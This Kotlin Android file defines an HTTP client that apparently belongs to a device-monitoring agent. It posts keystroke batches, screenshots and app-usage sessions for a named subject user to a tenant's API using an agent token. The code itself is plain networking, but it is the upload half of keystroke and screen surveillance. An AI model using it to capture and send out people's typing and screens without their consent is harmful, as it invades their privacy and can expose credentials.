package io.bheka.agent

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

/**
 * Thin, direct OkHttp wrapper that posts events to the Bheka API.
 *
 * Endpoint: POST {API_URL}/api/v1/agent/events
 * Auth:     X-Agent-Token: {token}
 *
 * All three event types (keystroke_batch, screenshot_capture,
 * app_usage_session) share the same envelope and are posted through
 * [postEvent]. No Retrofit — a handful of endpoints doesn't warrant it.
 */
class ApiClient(private val context: Context) {

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS) // screenshots can be several MB
            .readTimeout(15, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build()
    }

    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    sealed class Result {
        data class Success(val code: Int) : Result()
        data class Failure(val message: String, val code: Int? = null) : Result()
    }

    /**
     * Builds the common event envelope, merges in [metadata], and POSTs it.
     * Returns [Result] rather than throwing so callers (monitoring loops)
     * can log and continue without crashing the service.
     */
    suspend fun postEvent(eventType: String, occurredAt: String, metadata: JSONObject): Result =
        withContext(Dispatchers.IO) {
            val apiUrl = Config.apiUrl(context).trimEnd('/')
            val token = Config.agentToken(context)

            if (apiUrl.isBlank() || token.isBlank()) {
                return@withContext Result.Failure("Agent is not configured (missing API URL or token)")
            }

            val envelope = JSONObject().apply {
                put("tenantSlug", Config.tenantSlug(context))
                put("siteId", Config.siteId(context))
                put("subjectUserId", Config.subjectUserId(context))
                put("sourceAgentId", Config.sourceAgentId(context))
                put("eventType", eventType)
                put("occurredAt", occurredAt)
                put("metadata", metadata)
            }

            val bodyString = envelope.toString()
            val bodyBytes = bodyString.toByteArray(Charsets.UTF_8)
            if (bodyBytes.size > Utils.MAX_JSON_BODY_BYTES) {
                return@withContext Result.Failure(
                    "Event body too large (${bodyBytes.size} bytes), dropping event: $eventType"
                )
            }

            val request = Request.Builder()
                .url("$apiUrl/api/v1/agent/events")
                .addHeader("X-Agent-Token", token)
                .addHeader("Content-Type", "application/json")
                .post(bodyBytes.toRequestBody(jsonMediaType))
                .build()

            try {
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Utils.logd("Posted $eventType event -> HTTP ${response.code}")
                        Result.Success(response.code)
                    } else {
                        val errBody = try {
                            response.body?.string()
                        } catch (e: IOException) {
                            null
                        }
                        Utils.logw("Failed to post $eventType event: HTTP ${response.code} $errBody")
                        Result.Failure("HTTP ${response.code}: $errBody", response.code)
                    }
                }
            } catch (e: IOException) {
                Utils.loge("Network error posting $eventType event", e)
                Result.Failure("Network error: ${e.message}")
            }
        }
}
